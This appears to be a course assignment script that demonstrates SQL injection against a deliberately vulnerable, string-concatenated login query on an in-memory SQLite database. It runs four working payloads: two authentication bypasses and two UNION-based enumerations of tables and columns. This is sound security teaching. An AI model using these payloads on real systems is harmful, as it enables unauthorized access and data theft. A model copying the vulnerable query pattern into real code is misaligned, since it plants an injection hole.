"""
SQL Injection Demonstrations

Vulnerable query:
"SELECT userid, username FROM users WHERE username='" + username + "' AND password='" + password + "';"
"""

import sqlite3


def setup_db():
    """Create an in-memory database with the users table."""
    conn = sqlite3.connect(":memory:")
    cursor = conn.cursor()
    cursor.executescript("""
        CREATE TABLE users (
            userid INT PRIMARY KEY,
            username TEXT,
            email TEXT,
            password TEXT
        );
        INSERT INTO users VALUES (1, 'cs162_user', 'cs162@minerva.kgi.edu', 'longpasswordsaresecure');
        INSERT INTO users VALUES (2, 'admin', 'admin@minerva.kgi.edu', '123456');
        INSERT INTO users VALUES (3, 'prof_smith', 'smith@minerva.kgi.edu', 'password123');
    """)
    return conn


def vulnerable_query(conn, username, password):
    """Simulate the vulnerable query from the assignment."""
    sql = "SELECT userid, username FROM users WHERE username='" + username + "' AND password='" + password + "';"
    print(f"  Executed SQL: {sql}")
    cursor = conn.cursor()
    try:
        results = cursor.execute(sql).fetchall()
    except Exception as e:
        print(f"  Error: {e}")
        return []
    return results


def main():
    conn = setup_db()

    # ----------------------------------------------------------------
    # Attack 1: Login as a KNOWN user without knowing their password
    # ----------------------------------------------------------------
    # Inject into username to close the quote, make the condition true,
    # and comment out the password check with --
    print("=" * 60)
    print("Attack 1: Login as known user 'admin' without password")
    print("=" * 60)
    username = "admin'--"
    password = "anything"
    # Resulting SQL:
    # SELECT userid, username FROM users WHERE username='admin'--' AND password='anything';
    results = vulnerable_query(conn, username, password)
    print(f"  Results: {results}\n")

    # ----------------------------------------------------------------
    # Attack 2: Login as an UNKNOWN user (no username or password needed)
    # ----------------------------------------------------------------
    # Inject a condition that is always true: ' OR 1=1 --
    print("=" * 60)
    print("Attack 2: Login as any user without credentials")
    print("=" * 60)
    username = "' OR 1=1--"
    password = "anything"
    # Resulting SQL:
    # SELECT userid, username FROM users WHERE username='' OR 1=1--' AND password='anything';
    results = vulnerable_query(conn, username, password)
    print(f"  Results: {results}\n")

    # ----------------------------------------------------------------
    # Attack 3 (Optional): List all tables in the database
    # ----------------------------------------------------------------
    # Use UNION SELECT to query sqlite_master for table names.
    # We need 2 columns to match the original SELECT's column count.
    print("=" * 60)
    print("Attack 3: List all tables in the database")
    print("=" * 60)
    username = "' UNION SELECT name, type FROM sqlite_master WHERE type='table'--"
    password = "anything"
    # Resulting SQL:
    # SELECT userid, username FROM users WHERE username=''
    #   UNION SELECT name, type FROM sqlite_master WHERE type='table'--' AND password='anything';
    results = vulnerable_query(conn, username, password)
    print(f"  Results: {results}\n")

    # ----------------------------------------------------------------
    # Attack 4 (Optional): List all columns in the 'users' table
    # ----------------------------------------------------------------
    # Use PRAGMA table_info via UNION SELECT.
    # PRAGMA returns multiple columns; we pick the ones we need (name and type).
    print("=" * 60)
    print("Attack 4: List all columns in the 'users' table")
    print("=" * 60)
    username = "' UNION SELECT name, type FROM pragma_table_info('users')--"
    password = "anything"
    # Resulting SQL:
    # SELECT userid, username FROM users WHERE username=''
    #   UNION SELECT name, type FROM pragma_table_info('users')--' AND password='anything';
    results = vulnerable_query(conn, username, password)
    print(f"  Results: {results}\n")

    conn.close()


if __name__ == "__main__":
    main()
